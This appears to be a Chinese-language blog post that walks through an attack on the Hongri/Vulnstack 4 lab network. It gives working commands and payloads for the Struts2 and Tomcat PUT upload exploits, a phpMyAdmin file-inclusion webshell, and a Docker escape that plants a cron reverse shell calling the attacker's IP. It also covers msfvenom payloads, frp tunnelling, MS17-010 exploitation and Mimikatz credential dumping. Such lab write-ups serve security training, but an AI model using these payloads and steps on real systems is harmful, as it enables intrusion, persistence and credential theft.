@@ -1,0 +1,363 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>红日靶场(4) | willsafeのBlog</title><meta name="author" content="willsafe"><meta name="copyright" content="willsafe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="成长不是改变自己，而是不断完善自己。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场(4)">
+<meta property="og:url" content="http://willsafe.github.io/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/index.html">
+<meta property="og:site_name" content="willsafeのBlog">
+<meta property="og:description" content="成长不是改变自己，而是不断完善自己。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imgxz.bizhi3.com/cont/20220712/bokqceleh0u.jpg">
+<meta property="article:published_time" content="2024-04-19T07:46:38.000Z">
+<meta property="article:modified_time" content="2024-04-19T14:29:47.780Z">
+<meta property="article:author" content="willsafe">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imgxz.bizhi3.com/cont/20220712/bokqceleh0u.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="http://willsafe.github.io/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":100,"languages":{"author":"作者: willsafe","link":"链接: ","source":"来源: willsafeのBlog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '红日靶场(4)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-19 22:29:47'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/icon.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 7.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://imgxz.bizhi3.com/cont/20221213/4byfdiqvs4i.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="willsafeのBlog"></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">红日靶场(4)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-19T07:46:38.000Z" title="发表于 2024-04-19 15:46:38">2024-04-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-19T14:29:47.780Z" title="更新于 2024-04-19 22:29:47">2024-04-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="红日靶场(4)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一、环境拓扑"><a href="#一、环境拓扑" class="headerlink" title="一、环境拓扑"></a>一、环境拓扑</h1><p><a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">漏洞详情 (qiyuanxuetang.net)</a></p>
+<p>kali:192.168.111.9<br>win7:192.168.183.2<br>WEB:192.168.111.14    192.168.183.3<br>DC:192.168.183.130<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190006210.png"></p>
+<h1 id="二、打点"><a href="#二、打点" class="headerlink" title="二、打点"></a>二、打点</h1><h2 id="2-1-主机探测"><a href="#2-1-主机探测" class="headerlink" title="2.1 主机探测"></a>2.1 主机探测</h2><p><code>nmap -Pn 192.168.111.0/24</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190107910.png"></p>
+<h2 id="2-2-端口探测"><a href="#2-2-端口探测" class="headerlink" title="2.2 端口探测"></a>2.2 端口探测</h2><p><code>nmap -p- -sT -sV -T4 192.168.111.14</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190129614.png"></p>
+<h2 id="2-3-服务探针"><a href="#2-3-服务探针" class="headerlink" title="2.3 服务探针"></a>2.3 服务探针</h2><h3 id="2-3-1-struts2-2001端口"><a href="#2-3-1-struts2-2001端口" class="headerlink" title="2.3.1 struts2(2001端口)"></a>2.3.1 struts2(2001端口)</h3><p><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190210974.png"><br>看到是一个文件上传点，尝试上传，但是没啥用，但是可以看到是struct2框架(这个老旧的框架，直接历史漏洞试试)<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190234438.png"></p>
+<ul>
+<li>历史漏洞工具探测<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190313956.png"><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190322974.png"><br>ok，成功RCE，上传一个webshell，冰蝎生成木马，连接成功<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190352751.png"></li>
+<li>反弹到msf上<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190420301.png"></li>
+<li>收集收集信息，有什么东西(发现是个docker容器)<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190509518.png"><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190516119.png"></li>
+</ul>
+<h3 id="2-3-2-struts2流量特征"><a href="#2-3-2-struts2流量特征" class="headerlink" title="2.3.2 struts2流量特征"></a>2.3.2 struts2流量特征</h3><p><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190616968.png"></p>
+<h3 id="2-3-3-tomcat-2002端口"><a href="#2-3-3-tomcat-2002端口" class="headerlink" title="2.3.3 tomcat(2002端口)"></a>2.3.3 tomcat(2002端口)</h3><p><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190715417.png"><br>看到上面的界面的思路：1.历史漏洞 2.弱口令(尝试无果)</p>
+<p>查找一下该版本有没有漏洞，找到CVE-2017-12615的任意文件上传漏洞<br>影响版本：<br>    Apache Tomcat 7.0.0 - 7.0.79<br>    Apache Tomcat 8.5.19<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190902438.png"><br>尝试修改数据包的类型，201发现成功了，PUT一些内容看看<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190926686.png"><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419190938501.png"><br>成功回显，继续上传，内容为一句话木马jsp<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419191020048.png"><br>404，不让上传，估计是过滤，试试绕过，加个%20<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419191105646.png"><br>成功了，访问一看被解析成文本了<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419191158782.png"><br>再尝试绕过，换成&#x2F;<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419191222096.png"><br>ok，成功连接webshell<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419191241126.png"></p>
+<ul>
+<li>信息收集，发现依旧是docker容器<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419191321945.png"></li>
+</ul>
+<h3 id="2-3-4-phpmyadmin-2003端口"><a href="#2-3-4-phpmyadmin-2003端口" class="headerlink" title="2.3.4 phpmyadmin(2003端口)"></a>2.3.4 phpmyadmin(2003端口)</h3><p><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419191403989.png"><br>直接都不需要登录就进来了。。。<br>看到版本信息为4.8.1，上网查找有可利用的漏洞(CVE-2018-12613)<br>漏洞详细：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12184?time__1311=mqmhD5DK7KYIMDBdPkGk8di=e=GIPDkSleD&alichlgref=https://cn.bing.com/#toc-0">CVE-2018-12613 本地文件包含漏洞复现+漏洞分析 - 先知社区 (aliyun.com)</a><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419191819878.png"><br>可以文件包含，没有文件操作权限<br><code>show global variables like &#39;secure_file_priv&#39;;</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419191850513.png"><br>日志看看开关，<code>show global variables like &quot;general_log%&quot;;</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419191904478.png"></p>
+<ul>
+<li>文件包含指向session<br><code>select &#39;&lt;?php phpinfo();?&gt;&#39;;</code>执行，提取phpmyadmin的session<br><code>http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_session</code><br>成功，可以得到网站的绝对路径，可以尝试利用PHPmyadmin的日志写shell<br><a href="%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1.md">红日靶场-1</a>，这里cve漏洞的<br>写入webshell<code>select &#39;&lt;?php file_put_contents(&quot;shell.php&quot;,&quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot;);?&gt;&#39;;</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419192109390.png"><br>ok利用成功<br><code>http://192.168.111.14:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_1af8af5dd8f3b3838033b457aacc8fcd</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419192128656.png"><br>连接成功，webshell到手<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419192143244.png"></li>
+<li>依旧是docker<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419192210666.png"></li>
+</ul>
+<h3 id="2-3-5-蚁剑流量特征"><a href="#2-3-5-蚁剑流量特征" class="headerlink" title="2.3.5 蚁剑流量特征"></a>2.3.5 蚁剑流量特征</h3><p><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419192252601.png"><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419192306589.png"><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419210118675.png"></p>
+<ul>
+<li>每次重新连接都换UA头(可以自定义)</li>
+<li>很明显的@ini_set….php设置参数</li>
+<li>命令执行有eval、base64等</li>
+</ul>
+<h3 id="2-3-6-哥斯拉php流量特征"><a href="#2-3-6-哥斯拉php流量特征" class="headerlink" title="2.3.6 哥斯拉php流量特征"></a>2.3.6 哥斯拉php流量特征</h3><p><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419192312919.png"><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419210940664.png"></p>
+<ul>
+<li>UA头可自定义，但是Accept特征较为明显</li>
+<li>cookie后面有个分号</li>
+</ul>
+<h3 id="2-3-7-冰蝎4-1流量特征"><a href="#2-3-7-冰蝎4-1流量特征" class="headerlink" title="2.3.7 冰蝎4.1流量特征"></a>2.3.7 冰蝎4.1流量特征</h3><p><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419204124920.png"><br>上图中写错了，是冰蝎4.1<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419204217807.png"></p>
+<ul>
+<li>每次连接换UA，但是Accept特征较为明显</li>
+</ul>
+<h2 id="2-4-docker逃逸"><a href="#2-4-docker逃逸" class="headerlink" title="2.4 docker逃逸"></a>2.4 docker逃逸</h2><p>前面确定了都是docker，必须逃出来才能拿到物理机的权限</p>
+<h3 id="2-4-1-判断是否容器"><a href="#2-4-1-判断是否容器" class="headerlink" title="2.4.1 判断是否容器"></a>2.4.1 判断是否容器</h3><ol>
+<li>msf去run<br><code>run post/linux/gather/checkcontainer</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419193055773.png"></li>
+<li>检查根目录下是否存在.dockerenv文件<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419193112064.png"></li>
+<li>根据IP判断，一般容器IP为172开头(不一定)<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419193137464.png"></li>
+<li>确定是特权模式启动的docker<br><code>cat /proc/self/status|grep CapEff</code><br>CapEff 对应的掩码值为：0000003fffffffff	可以用privilege特权模式逃逸</li>
+</ol>
+<h3 id="2-4-2-docker逃逸"><a href="#2-4-2-docker逃逸" class="headerlink" title="2.4.2 docker逃逸"></a>2.4.2 docker逃逸</h3><ol>
+<li>脏牛dirty cow内核实现逃逸—-CVE-2016-5195<br><a href="%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83.md">脏牛提权</a></li>
+<li>docker自身软件的漏洞—-CVE-2019-5736<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/258398.html">docker逃逸漏洞复现（CVE-2019-5736） - FreeBuf网络安全行业门户</a></li>
+<li>特权模式逃逸</li>
+</ol>
+<ul>
+<li>structs2的未发现挂载<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419193531164.png"><br><code>fdisk -l</code> 命令，可以查看系统中所有硬盘的分区情况，包括分区的大小、类型、起始位置等信息。</li>
+<li>tomcat的有回显<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419193658493.png"><br><strong>特权模式逃逸</strong><br>创建一个文件夹，将宿主机根目录挂载至容器目录下<br><code>mkdir /test</code>     容器内创建一个目录<br><code>mount /dev/sda1 /tset</code>           将宿主机根目录挂载至容器目录下<br>挂载成功且可以看到读取不同的&#x2F;etc&#x2F;passwd内容不同<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419193925805.png"><br><strong>SSH公钥写入</strong><br>kali生成私钥<code>ssh-keygen -f will</code>,写入到挂载的主机ssh里<br><code>cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</code>  —— avx连权限一起复制过去<br><code>echo &#39;will.pub内容&#39; &gt;&gt; /test/home/ubuntu/.ssh/authorized_keys</code><br>写入了，但是连接依旧需要密码<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419193946156.png"><br><strong>crontab计划任务</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash -i &gt;&amp; bash -i &gt;&amp; /dev/tcp/192.168.111.9/9999 0&gt;&amp;1&quot;</span> &gt;&gt; /test/tmp/shell.sh</span><br><span class="line"><span class="built_in">chmod</span> +x /test/tmp/shell.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*/2 * * * * root  bash /tmp/shell.sh&#x27;</span> &gt; /test/etc/crontab</span><br></pre></td></tr></table></figure>
+<img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419194417008.png"><br>成功逃逸，且拿到的是root权限，那就不需要提权了，如果是低权限，上传信息收集脚本提权，SUID或者内核等等</li>
+</ul>
+<h1 id="三、内网渗透"><a href="#三、内网渗透" class="headerlink" title="三、内网渗透"></a>三、内网渗透</h1><h2 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1 信息收集"></a>3.1 信息收集</h2><p>内网网段，ping一下发现不通<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419194647797.png"><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419194658892.png"></p>
+<h3 id="3-1-1-先把linux反弹到msf上"><a href="#3-1-1-先把linux反弹到msf上" class="headerlink" title="3.1.1 先把linux反弹到msf上"></a>3.1.1 先把linux反弹到msf上</h3><p>生成木马<br><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.111.9 LPORT=1234 -f elf -o ./1</code><br>python3启一个web，<code>python3 -m http.server 80 -d .</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419194748629.png"></p>
+<h3 id="3-1-2-上传fscan扫"><a href="#3-1-2-上传fscan扫" class="headerlink" title="3.1.2 上传fscan扫"></a>3.1.2 上传fscan扫</h3><p><code>upload /root/fscan /tmp</code><br><code>./fscan -h 192.168.183.0/24</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419194834725.png"><br>三台存活192.168.183.2、192.168.183.3、192.168.183.130存活<br>192.168.183.3是web(已拿下)<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419194944373.png"><br>有MS17-010，打一下试试</p>
+<h2 id="3-2-添加frp代理隧道"><a href="#3-2-添加frp代理隧道" class="headerlink" title="3.2 添加frp代理隧道"></a>3.2 添加frp代理隧道</h2><ul>
+<li>kali运行服务端.&#x2F;frps<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure></li>
+<li>靶机linux运行客户端.&#x2F;frpc<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.111.9</span><br><span class="line">server_port = 7000</span><br><span class="line">[plugin_socks5]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 7777</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure></li>
+<li>服务端启动<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419195407726.png"></li>
+<li>客户端启动<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419195418918.png"><br>配置proxychain<br><code>vi /etc/proxychain.conf </code><br><code>socks5 127.0.0.1 7777</code><br>测试数据:proxychain curl 192.168.183.3:2001</li>
+</ul>
+<h2 id="3-3-msf添加全局代理"><a href="#3-3-msf添加全局代理" class="headerlink" title="3.3 msf添加全局代理"></a>3.3 msf添加全局代理</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use 0</span><br><span class="line">setg proxies socks5:127.0.0.1:7777  	设置msf的全局代理</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp	不出网走正向连接</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.183.2					目标win7</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="3-3-1-攻击win7"><a href="#3-3-1-攻击win7" class="headerlink" title="3.3.1 攻击win7"></a>3.3.1 攻击win7</h3><p><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419195541774.png"><br>win7拿下，但是域控不行，换方法<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419195556144.png"></p>
+<h3 id="3-3-2-在win7收集信息"><a href="#3-3-2-在win7收集信息" class="headerlink" title="3.3.2 在win7收集信息"></a>3.3.2 在win7收集信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load  kiwi</span><br><span class="line">creds_all			抓取密码</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419195636461.png"><br>域用户凭据：douser        DEMO    Dotest123</p>
